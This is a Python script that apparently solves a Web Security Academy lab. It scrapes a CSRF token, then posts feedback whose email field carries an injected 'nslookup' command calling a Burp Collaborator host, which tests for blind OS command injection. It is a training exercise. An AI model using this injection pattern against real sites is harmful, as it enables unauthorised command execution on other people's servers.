import requests
from bs4 import BeautifulSoup

site = '0a7400fd0419e25fe95e34b2006000f0.web-security-academy.net'

# URL to load feedback form (to get CSRF token)
feedback_url = f'https://{site}/feedback'

# URL to submit feedback
feedback_submit_url = f'https://{site}/feedback/submit'

# Start session
s = requests.Session()

# Step 1: Fetch CSRF token
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Step 2: Craft malicious payload for email field
# (Using dummy subdomain under burpcollaborator.net to trigger DNS lookup)
burp_subdomain = 'test123.burpcollaborator.net'
payload_email = f'anything||nslookup {burp_subdomain}||'

# Step 3: Post the malicious feedback
post_data = {
    'csrf': csrf,
    'name': 'Jarren Calizo',
    'email': payload_email,
    'subject': 'Testing',
    'message': 'Testing message.'
}

resp = s.post(feedback_submit_url, data=post_data)

# Step 4: Print output to verify submission
print("[✓] Feedback submitted — check for lab solve on page!")